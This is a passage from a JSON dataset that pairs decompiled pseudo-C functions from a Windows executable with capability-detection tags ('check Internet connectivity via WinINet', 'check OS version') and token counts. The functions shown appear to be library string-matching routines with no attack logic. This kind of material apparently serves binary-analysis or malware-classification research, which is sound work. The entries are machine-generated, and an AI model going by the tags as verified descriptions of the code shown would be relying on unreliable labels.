   } while (uVar10 < uVar19);\ncode_r0x00014003359a:\n    piVar20 = piStack120;\n    if (uVar19 < 2) goto code_r0x000140033786;\n    uVar10 = *var_58h;\n    goto code_r0x000140033440;\n}\n",
        "token_count": 7464
    },
    "1400365e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t **\nfcn.1400365e0(uint64_t **arg1, ulong noname_1, uint64_t **arg3, uint64_t **arg4, int32_t *noname_4, int64_t noname_5, \n             int64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    int32_t *piVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    ulong uVar4;\n    uint8_t uVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint64_t *puVar10;\n    int64_t iVar11;\n    uint64_t *puVar12;\n    int64_t iVar13;\n    bool bVar14;\n    bool bVar15;\n    uint64_t *puVar16;\n    uchar *puVar17;\n    bool bVar18;\n    uint64_t uVar19;\n    int64_t iVar20;\n    uint64_t *puVar21;\n    uint64_t uVar22;\n    uint64_t *puVar23;\n    uint64_t *puVar24;\n    uint8_t uVar25;\n    ulong var_8h_2;\n    int32_t iVar26;\n    uint32_t *var_bp_50h;\n    ulong uStack160;\n    uchar auStack152 [32];\n    ulong uStack120;\n    uint64_t *puStack112;\n    uint64_t *puStack104;\n    uint64_t *puStack96;\n    uint64_t *puStack88;\n    uint64_t *puStack80;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    puStack88 = arg3[1];\n    puStack96 = *arg4;\n    puVar23 = arg4[1];\n    puVar24 = *arg3;\n    puVar16 = noname_7 + 0xd0;\n    iVar7 = puStack88;\n    puStack104 = puStack104 & 0xffffffff00000000 | puStack88 & 0xffffffff;\n    uStack160 = 0x14003662d;\n    puStack80 = puStack96;\n    puVar10 = fcn.1400b97f0(puVar16);\n    uStack160 = 0x140036648;\n    iVar11 = fcn.1400147b0(puVar16);\n    puVar12 = puStack104;\n    uVar22 = puStack104 & 0xffffffff;\n    iVar11 = -iVar11;\n    puVar17 = &stack0xffffffffffffff68 + iVar11;\n    puStack104._0_1_ = iVar7 == -1;\n    piVar1 = &stack0xffffffffffffff88 + iVar11;\n    bVar18 = puVar24 != NULL && puStack104;\n    puVar21 = puStack96;\n    bVar14 = bVar18;\n    if ((bVar18) && (puStack104._0_1_ = 0,  puVar24[3] <= puVar24[2])) {\n        puStack112 = puStack96;\n        puStack104 = puStack104 & 0xffffffffffffff00;\n        puStack96 = puStack96 & 0xffffffff00000000 | puVar12 & 0xffffffff;\n        pcVar3 = *(*puVar24 + 0x48);\n        *(&stack0xffffffffffffff60 + iVar11) = 0x1400369ae;\n        puVar16 = puVar24;\n        iVar7 = (*pcVar3)();\n        uVar22 = puStack96 & 0xffffffff;\n        puVar21 = puStack112;\n        if (iVar7 == -1) {\n            puVar24 = NULL;\n            bVar14 = false;\n            puStack104._0_1_ = bVar18;\n        }\n    }\n    puStack112._0_1_ = puVar23 == -1;\n    bVar15 = puVar21 != NULL && puStack112;\n    bVar18 = puStack112;\n    if (bVar15) {\n        if (puVar21[2] < puVar21[3]) {\n            bVar18 = false;\n        }\n        else {\n            puStack104 = puStack104 & 0xffffffffffffff00 | puStack104;\n            puStack96 = puStack96 & 0xffffffff00000000 | uVar22;\n            puStack80 = puVar21;\n            pcVar3 = *(*puVar21 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar11) = 0x140036ac1;\n            iVar7 = (*pcVar3)();\n            uVar22 = puStack96 & 0xffffffff;\n            puVar16 = NULL;\n            if (iVar7 != -1) {\n                puVar16 = puStack80;\n            }\n            puStack80 = puVar16;\n            puVar16 = puVar21;\n            bVar18 = iVar7 == -1 && bVar15;\n        }\n    }\n    if (bVar18 != puStack104) {\n        uVar19 = uVar22;\n        if (bVar14) {\n            if (puVar24[2] < puVar24[3]) {\n                uVar19 = *puVar24[2];\n            }\n            else {\n                puStack96 = puStack96 & 0xffffffff00000000 | uVar22;\n                pcVar3 = *(*puVar24 + 0x48);\n                *(&stack0xffffffffffffff60 + iVar11) = 0x140036b1a;\n                puVar16 = puVar24;\n                uVar8 = (*pcVar3)();\n                uVar22 = puStack96 & 0xffffffff;\n                uVar9 = 0xffffffff;\n                if (uVar8 != 0xffffffff) {\n                    uVar9 = uVar8;\n                }\n                uVar19 = uVar9;\n                if (uVar8 == 0xffffffff) {\n                    puVar24 = NULL;\n                }\n            }\n        }\n        iVar13 = noname_6 * 2;\n        if (iVar13 != 0) {\n            puVar23 = NULL;\n            puStack104 = puVar24;\n            iVar20 = 0;\n            puStack112 = puStack112 & 0xffffffffffffff00 | puStack112;\n            puStack96 = puStack96 & 0xffffffff00000000 | uVar22;\n            do {\n                while (**(noname_5 + iVar20 * 8) == uVar19) {\ncode_r0x0001400368e3:\n                    piVar1[puVar23] = iVar20;\n                    iVar20 = iVar20 + 1;\n                    puVar23 = puVar23 + 1;\n                    if (iVar20 == iVar13) goto code_r0x0001400368f4;\n                }\n                pcVar3 = *(*puVar10 + 0x10);\n                *(&stack0xffffffffffffff60 + iVar11) = 0x1400368c9;\n                puVar16 = puVar10;\n                cVar6 = (*pcVar3)();\n                if (cVar6 == uVar19) goto code_r0x0001400368e3;\n                iVar20 = iVar20 + 1;\n            } while (iVar20 != iVar13);\ncode_r0x0001400368f4:\n            puVar24 = puStack104;\n            uVar22 = puStack96 & 0xffffffff;\n            if (puVar23 != NULL) {\n                if (puStack104[2] < puStack104[3]) {\n                    puStack104[2] = puStack104[2] + 1;\n                    puVar12 = puStack80;\n                }\n                else {\n                    puStack96 = puStack80;\n                    puStack80 = puVar23;\n                    pcVar3 = *(*puStack104 + 0x50);\n                    *(&stack0xffffffffffffff60 + iVar11) = 0x140036afb;\n                    puVar16 = puVar24;\n                    (*pcVar3)();\n                    puVar23 = puStack80;\n                    puVar12 = puStack96;\n                }\n                *(&stack0xffffffffffffff60 + iVar11) = 0x14003693b;\n                iVar13 = fcn.1400147b0(puVar16);\n                puVar16 = NULL;\n                iVar13 = -iVar13;\n                puVar17 = &stack0xffffffffffffff68 + iVar13 + iVar11;\n                puStack80 = puVar12;\n                puStack96 = &stack0xffffffffffffff88 + iVar13 + iVar11;\n                do {\n                    uVar4 = *(noname_5 + piVar1[puVar16] * 8);\n                    *(&stack0xffffffffffffff60 + iVar13 + iVar11) = 0x140036965;\n                    uVar22 = sub.msvcrt.dll_strlen(uVar4);\n                    *(&stack0xffffffffffffff88 + iVar13 + iVar11 + puVar16 * 8) = uVar22;\n                    puVar16 = puVar16 + 1;\n                } while (puVar23 != puVar16);\n                uVar22 = 0xffffffff;\n                uVar19 = 1;\n                puVar23 = puStack96;\n                uVar25 = puStack112;\n                goto code_r0x0001400366a0;\n            }\n        }\n    }\n    puVar16 = NULL;\n    uVar19 = 0;\n    puVar23 = NULL;\n    uVar25 = puStack112;\ncode_r0x0001400366a0:\n    do {\n        puStack96._0_1_ = uVar22 == -1;\n        bVar14 = puVar24 != NULL && puStack96;\n        puStack104._0_1_ = puStack96;\n        if (bVar14) {\n            if (puVar24[2] < puVar24[3]) {\n                puStack104._0_1_ = 0;\n            }\n            else {\n                puStack112 = puStack112 & 0xffffffff00000000 | uVar22;\n                puStack104 = puStack104 & 0xffffffffffffff00 | bVar14;\n                puStack96 = puStack96 & 0xffffffffffffff00 | puStack96;\n                pcVar3 = *(*puVar24 + 0x48);\n                *(puVar17 + -8) = 0x140036a7a;\n                iVar7 = (*pcVar3)(puVar24);\n                uVar22 = puStack112 & 0xffffffff;\n                if (iVar7 == -1) {\n                    puVar24 = NULL;\n                }\n                else {\n                    puStack104._0_1_ = 0;\n                }\n            }\n        }\n        puVar12 = puStack80;\n        uVar5 = puStack80 != NULL & uVar25;\n        puStack112._0_1_ = uVar25;\n        if (uVar5 == 0) {\ncode_r0x0001400366d1:\n            if (puStack112 == puStack104) break;\n        }\n        else {\n            if (puStack80[3] <= puStack80[2]) {\n                uStack120._4_4_ = uVar22;\n                puStack112 = puStack112 & 0xffffffffffffff00 | uVar5;\n                puStack104 = puStack104 & 0xffffffffffffff00 | puStack104;\n                puStack96 = puStack96 & 0xffffffffffffff00 | puStack96;\n                pcVar3 = *(*puStack80 + 0x48);\n                *(puVar17 + -8) = 0x140036a34;\n                iVar7 = (*pcVar3)(puVar12);\n                uVar22 = uStack120._4_4_;\n                puVar12 = NULL;\n                if (iVar7 != -1) {\n                    puVar12 = puStack80;\n                }\n                puStack80 = puVar12;\n                if (iVar7 != -1) {\n                    puStack112._0_1_ = 0;\n                }\n                goto code_r0x0001400366d1;\n            }\n            if (puStack104 == 0) break;\n        }\n        if ((puVar24 == NULL) || (puStack96 == 0)) {\n            cVar6 = uVar22;\n        }\n        else if (puVar24[2] < puVar24[3]) {\n            cVar6 = *puVar24[2];\n        }\n        else {\n            puStack96 = puStack96 & 0xffffffff00000000 | uVar22;\n            pcVar3 = *(*puVar24 + 0x48);\n            *(puVar17 + -8) = 0x1400369fb;\n            iVar7 = (*pcVar3)(puVar24);\n            uVar22 = puStack96 & 0xffffffff;\n            cVar6 = iVar7;\n            if (iVar7 == -1) {\n                cVar6 = -1;\n                puVar24 = NULL;\n            }\n        }\n        if (puVar16 == NULL) goto code_r0x0001400367c8;\n        puVar12 = NULL;\n        puVar21 = NULL;\n        do {\n            while (puVar23[puVar12] <= uVar19) {\n                puVar21 = puVar21 + 1;\ncode_r0x000140036708:\n                puVar12 = puVar12 + 1;\n                if (puVar16 <= puVar12) goto code_r0x00014003673e;\n            }\n            if (*(*(noname_5 + piVar1[puVar12] * 8) + uVar19) == cVar6) goto code_r0x000140036708;\n            puVar16 = puVar16 + -1;\n            piVar1[puVar12] = piVar1[puVar16];\n            puVar23[puVar12] = puVar23[puVar16];\n        } while (puVar12 < puVar16);\ncode_r0x00014003673e:\n        if (puVar16 == puVar21) break;\n        if (puVar24[2] < puVar24[3]) {\n            puVar24[2] = puVar24[2] + 1;\n        }\n        else {\n            pcVar3 = *(*puVar24 + 0x50);\n            *(puVar17 + -8) = 0x14003684a;\n            (*pcVar3)(puVar24);\n        }\n        uVar19 = uVar19 + 1;\n        uVar22 = 0xffffffff;\n    } while( true );\n    if (puVar16 == 0x1) {\n        uVar2 = *puVar23;\njoined_r0x000140036852:\n        if (uVar2 == uVar19) {\ncode_r0x000140036858:\n            iVar7 = *piVar1;\n            if (iVar26 <= iVar7) {\n                iVar7 = iVar7 - iVar26;\n            }\n            *noname_4 = iVar7;\n            goto code_r0x0001400367d2;\n        }\n    }\n    else if (puVar16 == 0x2) {\n        if (*puVar23 != uVar19) {\n            uVar2 = puVar23[1];\n            goto joined_r0x000140036852;\n        }\n        goto code_r0x000140036858;\n    }\ncode_r0x0001400367c8:\n    *var_bp_50h = *var_bp_50h | 4;\ncode_r0x0001400367d2:\n    arg1[1] = puStack88 & 0xffffffff00000000 | uVar22;\n    *arg1 = puVar24;\n    return arg1;\n}\n",
        "token_count": 3585
    },
    "140038e3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.140038e30(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4, uint *noname_4, int64_t noname_5, \n             uint64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    uint64_t *puVar1;\n    ushort uVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    code *pcVar5;\n    ulong uVar6;\n    int16_t iVar7;\n    uint16_t uVar8;\n    int16_t iVar9;\n    int64_t *piVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    int16_t *piVar13;\n    uint64_t *puVar14;\n    int64_t iVar15;\n    int64_t *piVar16;\n    uint64_t uVar17;\n    bool bVar18;\n    uint8_t uVar19;\n    uint8_t uVar20;\n    uint uVar21;\n    uint64_t uVar22;\n    int64_t *piVar23;\n    uint64_t uVar24;\n    bool bVar25;\n    bool bVar26;\n    bool bVar27;\n    ulong var_8h_2;\n    uint32_t *var_50h;\n    ulong auStack224 [5];\n    uint64_t auStack184 [2];\n    int64_t *piStack168;\n    uint64_t uStack160;\n    uint64_t *puStack152;\n    int64_t *piStack144;\n    int64_t *piStack136;\n    uint8_t uStack121;\n    int64_t iStack120;\n    uint64_t var_68h;\n    int64_t *var_60h;\n    uint64_t *var_58h;\n    uint64_t *var_50h_2;\n    int64_t *var_48h;\n    ulong var_40h;\n    ulong var_31h;\n    ulong var_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    piVar23 = arg3[1];\n    piVar16 = *arg3;\n    piVar3 = *arg4;\n    piVar4 = arg4[1];\n    noname_7 = noname_7 + 0xd0;\n    var_48h = var_48h & 0xffffffff00000000 | piVar23 & 0xffffffff;\n    auStack224[0] = 0x140038e83;\n    piStack168 = piVar23;\n    piStack136 = piVar3;\n    var_50h_2 = piVar16;\n    piVar10 = fcn.1400b9850(noname_7);\n    auStack224[0] = 0x140038e96;\n    iVar11 = fcn.1400147b0(noname_7);\n    uVar12 = var_48h & 0xffffffff;\n    iVar11 = -iVar11;\n    bVar25 = piVar23 == -1;\n    bVar18 = bVar25 && piVar16 != NULL;\n    piVar23 = var_50h_2;\n    bVar27 = bVar25;\n    if (bVar18) {\n        if (piVar16[2] < piVar16[3]) {\n            iVar7 = *piVar16[2];\n        }\n        else {\n            pcVar5 = *(*piVar16 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x1400398ed;\n            iVar7 = (*pcVar5)(piVar16);\n            uVar12 = var_48h & 0xffffffff;\n        }\n        bVar27 = iVar7 == -1 && bVar18;\n        piVar23 = NULL;\n        if (iVar7 != -1) {\n            piVar23 = piVar16;\n        }\n    }\n    bVar26 = piVar4 == -1;\n    uStack121 = bVar26;\n    bVar18 = piVar3 != NULL && bVar26;\n    if (bVar18) {\n        if (piVar3[2] < piVar3[3]) {\n            iVar7 = *piVar3[2];\n            var_48h = piVar23;\n        }\n        else {\n            var_50h_2 = var_50h_2 & 0xffffffff00000000 | uVar12;\n            var_48h = piVar23;\n            pcVar5 = *(*piVar3 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x14003994d;\n            iVar7 = (*pcVar5)(piVar3);\n            uVar12 = var_50h_2 & 0xffffffff;\n        }\n        bVar26 = iVar7 == -1 && bVar18;\n        piStack136 = NULL;\n        if (iVar7 != -1) {\n            piStack136 = piVar3;\n        }\n        piVar23 = var_48h;\n    }\n    uVar21 = uVar12;\n    if (bVar26 != bVar27) {\n        if ((piVar23 == NULL) || (!bVar25)) {\n            uVar12 = uVar12 & 0xffff;\n        }\n        else {\n            if (piVar23[2] < piVar23[3]) {\n                uVar12 = *piVar23[2];\n                var_48h = piVar23;\n            }\n            else {\n                var_50h_2 = var_50h_2 & 0xffffffff00000000 | uVar12;\n                var_48h = piVar23;\n                pcVar5 = *(*piVar23 + 0x48);\n                *(&stack0xffffffffffffff20 + iVar11) = 0x140039976;\n                uVar12 = (*pcVar5)(piVar23);\n                uVar21 = SUB84(var_50h_2, 0);\n                uVar12 = uVar12 & 0xffff;\n            }\n            piVar23 = var_48h;\n            if (uVar12 == -1) {\n                piVar23 = NULL;\n            }\n        }\n        var_50h_2 = CONCAT44(var_50h_2._4_4_, uVar21);\n        var_48h = piVar23;\n        pcVar5 = *(*piVar10 + 0x40);\n        *(&stack0xffffffffffffff20 + iVar11) = 0x140038f3c;\n        iVar7 = (*pcVar5)(piVar10, uVar12);\n        pcVar5 = *(*piVar10 + 0x30);\n        *(&stack0xffffffffffffff20 + iVar11) = 0x140038f4a;\n        uVar8 = (*pcVar5)(piVar10, uVar12);\n        uVar24 = var_50h_2;\n        uVar12 = var_50h_2 & 0xffffffff;\n        piVar23 = var_48h;\n        if (noname_6 != 0) {\n            var_50h_2 = &stack0xffffffffffffff48 + iVar11;\n            var_60h = var_48h;\n            var_68h = var_68h & 0xffffffffffff0000 | uVar24 & 0xffff;\n            var_58h = &stack0xffffffffffffff48 + iVar11 + noname_6 * 8;\n            var_48h = var_48h & 0xffffffffffff0000 | uVar8;\n            uVar24 = 0;\n            uVar12 = 0;\n            do {\n                while( true ) {\n                    uVar17 = uVar12;\n                    uVar2 = **(noname_5 + uVar17 * 8);\n                    pcVar5 = *(*piVar10 + 0x40);\n                    *(&stack0xffffffffffffff20 + iVar11) = 0x140038fae;\n                    iVar9 = (*pcVar5)(piVar10, uVar2);\n                    if (iVar7 != iVar9) break;\ncode_r0x000140038fca:\n                    uVar6 = *(noname_5 + uVar17 * 8);\n                    uVar22 = uVar24 + 1;\n                    puVar1 = var_58h + uVar24;\n                    *(&stack0xffffffffffffff20 + iVar11) = 0x140038fe8;\n                    uVar12 = sub.msvcrt.dll_wcslen(uVar6);\n                    *puVar1 = uVar12;\n                    var_50h_2[uVar24] = uVar17;\n                    uVar24 = uVar22;\n                    uVar12 = uVar17 + 1;\n                    if (noname_6 == uVar17 + 1) goto code_r0x000140039001;\n                }\n                pcVar5 = *(*piVar10 + 0x30);\n                *(&stack0xffffffffffffff20 + iVar11) = 0x140038fc4;\n                iVar9 = (*pcVar5)(piVar10);\n                if (var_48h == iVar9) goto code_r0x000140038fca;\n                uVar12 = uVar17 + 1;\n            } while (noname_6 != uVar17 + 1);\ncode_r0x000140039001:\n            puVar1 = var_50h_2;\n            uVar12 = var_68h & 0xffff;\n            piVar23 = var_60h;\n            if (uVar24 < 2) {\n                var_68h = 0;\n            }\n            else {\n                uStack160 = uVar17 + 1;\n                var_68h = 0;\n                uVar12 = *var_58h;\n                iStack120 = uVar24 * 8;\n                puStack152 = var_58h + 1;\ncode_r0x000140039050:\n                puVar14 = puStack152;\n                uVar17 = uVar12;\n                do {\n                    if (*puVar14 < uVar17) {\n                        uVar17 = *puVar14;\n                    }\n                    puVar14 = puVar14 + 1;\n                } while (var_58h + iStack120 != puVar14);\n                var_68h = var_68h + 1;\n                if (piVar23[2] < piVar23[3]) {\n                    piVar23[2] = piVar23[2] + 2;\n                }\n                else {\n                    pcVar5 = *(*piVar23 + 0x50);\n                    *(&stack0xffffffffffffff20 + iVar11) = 0x14003930a;\n                    (*pcVar5)(piVar23);\n                }\n                if (var_68h == uVar17) {\n                    if (piVar23[2] < piVar23[3]) {\n                        iVar7 = *piVar23[2];\n                    }\n                    else {\n                        pcVar5 = *(*piVar23 + 0x48);\n                        *(&stack0xffffffffffffff20 + iVar11) = 0x140039937;\n                        iVar7 = (*pcVar5)(piVar23);\n                    }\n                    var_48h._0_1_ = iVar7 == -1;\n                    if (var_48h) {\n                        piVar23 = NULL;\n                    }\n                    uVar20 = piStack136 != NULL & uStack121;\n                    uVar19 = uStack121;\n                    if (uVar20 != 0) {\n                        if (piStack136[2] < piStack136[3]) {\n                            iVar7 = *piStack136[2];\n                        }\n                        else {\n                            var_48h = var_48h & 0xffffffffffffff00 | var_48h;\n                            pcVar5 = *(*piStack136 + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x140039903;\n                            iVar7 = (*pcVar5)();\n                        }\n                        if (iVar7 != -1) {\n                            uVar20 = 0;\n                        }\n                        piVar16 = NULL;\n                        if (iVar7 != -1) {\n                            piVar16 = piStack136;\n                        }\n                        piStack136 = piVar16;\n                        uVar19 = uVar20;\n                    }\n                    bVar27 = false;\n                    if (var_48h == uVar19) goto code_r0x000140039450;\n                    if (piVar23 == NULL) {\n                        iVar15 = *piVar10;\ncode_r0x0001400396f5:\n                        piVar23 = NULL;\n                        pcVar5 = *(iVar15 + 0x40);\n                        *(&stack0xffffffffffffff20 + iVar11) = 0x140039703;\n                        uVar8 = (*pcVar5)(piVar10, 0xffff);\n                        var_60h = var_60h & 0xffffffffffff0000 | uVar8;\n                    }\n                    else {\n                        if (piVar23[2] < piVar23[3]) {\n                            iVar7 = *piVar23[2];\n                        }\n                        else {\n                            pcVar5 = *(*piVar23 + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x140039925;\n                            iVar7 = (*pcVar5)(piVar23);\n                        }\n                        iVar15 = *piVar10;\n                        pcVar5 = *(iVar15 + 0x40);\n                        if (iVar7 == -1) goto code_r0x0001400396f5;\n                        *(&stack0xffffffffffffff20 + iVar11) = 0x14003938c;\n                        uVar8 = (*pcVar5)(piVar10);\n                        var_60h = var_60h & 0xffffffffffff0000 | uVar8;\n                        if (piVar23[2] < piVar23[3]) {\n                            iVar7 = *piVar23[2];\n                        }\n                        else {\n                            pcVar5 = *(*piVar23 + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x14003986e;\n                            iVar7 = (*pcVar5)(piVar23);\n                        }\n                        if (iVar7 == -1) {\n                            piVar23 = NULL;\n                        }\n                    }\n                    uVar22 = 0;\n                    pcVar5 = *(*piVar10 + 0x30);\n                    *(&stack0xffffffffffffff20 + iVar11) = 0x1400393c6;\n                    uVar8 = (*pcVar5)(piVar10);\n                    uVar17 = var_68h;\n                    piStack144 = piVar23;\n                    var_50h_2 = var_50h_2 & 0xffffffffffff0000 | uVar8;\n                    auStack184[1] = uVar12;\n                    var_48h = var_68h * 2;\n                    do {\n                        if (uVar17 < var_58h[uVar22]) {\n                            pcVar5 = *(*piVar10 + 0x40);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x140039416;\n                            iVar7 = (*pcVar5)(piVar10);\n                            if (iVar7 != var_60h) {\n                                pcVar5 = *(*piVar10 + 0x30);\n                                *(&stack0xffffffffffffff20 + iVar11) = 0x14003942d;\n                                iVar7 = (*pcVar5)(piVar10);\n                                if (var_50h_2 != iVar7) goto code_r0x000140039437;\n                            }\n                            bVar27 = true;\n                            piVar23 = piStack144;\n                            uVar12 = auStack184[1];\n                            goto code_r0x000140039450;\n                        }\ncode_r0x000140039437:\n                        uVar22 = uVar22 + 1;\n                    } while (uVar22 != uVar24);\n                    bVar27 = false;\n                    piVar23 = piStack144;\n                    uVar12 = auStack184[1];\ncode_r0x000140039450:\n                    puVar14 = var_58h;\n                    uVar17 = 0;\n                    do {\n                        if ((var_68h == uVar12) == bVar27) {\n                            uVar24 = uVar24 - 1;\n                            iStack120 = uVar24 * 8;\n                            puVar1[uVar17] = puVar1[uVar24];\n                            var_58h[uVar17] = var_58h[uVar24];\n                            if (uVar24 <= uVar17) goto code_r0x000140039498;\n                        }\n                        else {\n                            uVar17 = uVar17 + 1;\n                            if (uVar24 <= uVar17) goto code_r0x000140039498;\n                        }\n                        uVar12 = var_58h[uVar17];\n                    } while( true );\n                }\n                if (var_68h < uVar17) {\n                    piVar13 = piVar23[2];\n                    if (piVar23[3] <= piVar13) goto code_r0x0001400394f6;\n                    goto code_r0x0001400390bc;\n                }\ncode_r0x000140039290:\n                uVar12 = 0xffffffff;\n            }\n            if (uVar24 == 1) {\n                if (piVar23[2] < piVar23[3]) {\n                    piVar23[2] = piVar23[2] + 2;\n                    var_48h = piVar23;\n                }\n                else {\n                    var_48h = piVar23;\n                    pcVar5 = *(*piVar23 + 0x50);\n                    *(&stack0xffffffffffffff20 + iVar11) = 0x140039802;\n                    (*pcVar5)(piVar23);\n                }\n                uVar24 = *puVar1;\n                var_68h = var_68h + 1;\n                uVar12 = *var_58h;\n                iVar15 = *(noname_5 + uVar24 * 8);\n                piVar23 = var_48h;\n                if (var_68h < uVar12) {\ncode_r0x000140039565:\n                    do {\n                        if (piVar23[2] < piVar23[3]) {\n                            iVar7 = *piVar23[2];\n                        }\n                        else {\n                            var_48h = piVar23;\n                            pcVar5 = *(*piVar23 + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x140039845;\n                            iVar7 = (*pcVar5)(piVar23);\n                            piVar23 = var_48h;\n                        }\n                        bVar27 = iVar7 == -1;\n                        if (bVar27) {\n                            piVar23 = NULL;\n                        }\ncode_r0x000140039587:\n                        uVar21 = uVar24;\n                        uVar20 = piStack136 != NULL & uStack121;\n                        uVar19 = uStack121;\n                        if (uVar20 != 0) {\n                            if (piStack136[2] < piStack136[3]) {\n                                iVar7 = *piStack136[2];\n                                var_48h = piVar23;\n                            }\n                            else {\n                                var_48h = piVar23;\n                                pcVar5 = *(*piStack136 + 0x48);\n                                *(&stack0xffffffffffffff20 + iVar11) = 0x14003982f;\n                                iVar7 = (*pcVar5)();\n                            }\n                            if (iVar7 != -1) {\n                                uVar20 = 0;\n                            }\n                            piVar23 = NULL;\n                            if (iVar7 != -1) {\n                                piVar23 = piStack136;\n                            }\n                            piStack136 = piVar23;\n                            piVar23 = var_48h;\n                            uVar19 = uVar20;\n                        }\n                        if (uVar19 == bVar27) goto code_r0x0001400392e0;\n                        var_48h = piVar23;\n                        uVar2 = *(iVar15 + var_68h * 2);\n                        pcVar5 = *(*piVar10 + 0x40);\n                        *(&stack0xffffffffffffff20 + iVar11) = 0x1400395ba;\n                        iVar7 = (*pcVar5)(piVar10, uVar2);\n                        piVar23 = var_48h;\n                        if (var_48h == NULL) {\ncode_r0x0001400395c9:\n                            pcVar5 = *(*piVar10 + 0x40);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x1400395d7;\n                            iVar9 = (*pcVar5)(piVar10);\n                            if (iVar7 != iVar9) {\n                                uVar2 = *(iVar15 + var_68h * 2);\n                                pcVar5 = *(*piVar10 + 0x30);\n                                *(&stack0xffffffffffffff20 + iVar11) = 0x140039519;\n                                iVar7 = (*pcVar5)(piVar10, uVar2);\n                                var_48h = NULL;\ncode_r0x000140039523:\n                                pcVar5 = *(*piVar10 + 0x30);\n                                *(&stack0xffffffffffffff20 + iVar11) = 0x140039530;\n                                iVar9 = (*pcVar5)(piVar10);\n                                piVar23 = var_48h;\n                                if (iVar9 == iVar7) goto code_r0x00014003953d;\n                                goto code_r0x0001400392e0;\n                            }\n                            uVar17 = *0x10;\n                            piVar23 = NULL;\n                            if (*0x10 < *0x18) goto code_r0x00014003954b;\ncode_r0x0001400395f1:\n                            var_48h = piVar23;\n                            pcVar5 = *(*piVar23 + 0x50);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x1400395fe;\n                            (*pcVar5)(piVar23);\n                            var_68h = var_68h + 1;\n                            piVar23 = var_48h;\n                            if (uVar12 == var_68h) break;\n                            goto code_r0x000140039565;\n                        }\n                        if (var_48h[2] < var_48h[3]) {\n                            iVar9 = *var_48h[2];\n                        }\n                        else {\n                            pcVar5 = *(*var_48h + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x140039818;\n                            iVar9 = (*pcVar5)(piVar23);\n                        }\n                        if (iVar9 == -1) goto code_r0x0001400395c9;\n                        pcVar5 = *(*piVar10 + 0x40);\n                        *(&stack0xffffffffffffff20 + iVar11) = 0x140039684;\n                        iVar9 = (*pcVar5)(piVar10);\n                        if (iVar7 != iVar9) {\n                            pcVar5 = *(*piVar10 + 0x30);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x1400396a6;\n                            iVar7 = (*pcVar5)(piVar10);\n                            piVar23 = var_48h;\n                            if (var_48h[2] < var_48h[3]) {\n                                iVar9 = *var_48h[2];\n                            }\n                            else {\n                                pcVar5 = *(*var_48h + 0x48);\n                                *(&stack0xffffffffffffff20 + iVar11) = 0x14003985b;\n                                iVar9 = (*pcVar5)(piVar23);\n                            }\n                            if (iVar9 == -1) {\n                                var_48h = NULL;\n                            }\n                            goto code_r0x000140039523;\n                        }\ncode_r0x00014003953d:\n                        uVar17 = var_48h[2];\n                        piVar23 = var_48h;\n                        if (var_48h[3] <= uVar17) goto code_r0x0001400395f1;\ncode_r0x00014003954b:\n                        var_68h = var_68h + 1;\n                        piVar23[2] = uVar17 + 2;\n                    } while (uVar12 != var_68h);\n                }\n                else {\ncode_r0x0001400392e0:\n                    uVar21 = uVar24;\n                    if (uVar12 != var_68h) {\ncode_r0x0001400392ed:\n                        uVar12 = 0xffffffff;\n                        goto code_r0x000140038ee5;\n                    }\n                }\n                uVar8 = 0xffff;\n                *noname_4 = uVar21;\n                goto code_r0x000140038eef;\n            }\n        }\n    }\ncode_r0x000140038ee5:\n    uVar8 = uVar12;\n    *var_50h = *var_50h | 4;\ncode_r0x000140038eef:\n    *arg1 = piVar23;\n    arg1[1] = piStack168 & 0xffffffffffff0000 | uVar8;\n    return arg1;\ncode_r0x000140039498:\n    if (bVar27 == false) {\n        if (uVar24 == 2) {\n            if ((uStack160 & 1) != 0) goto code_r0x0001400392ed;\n            uVar24 = 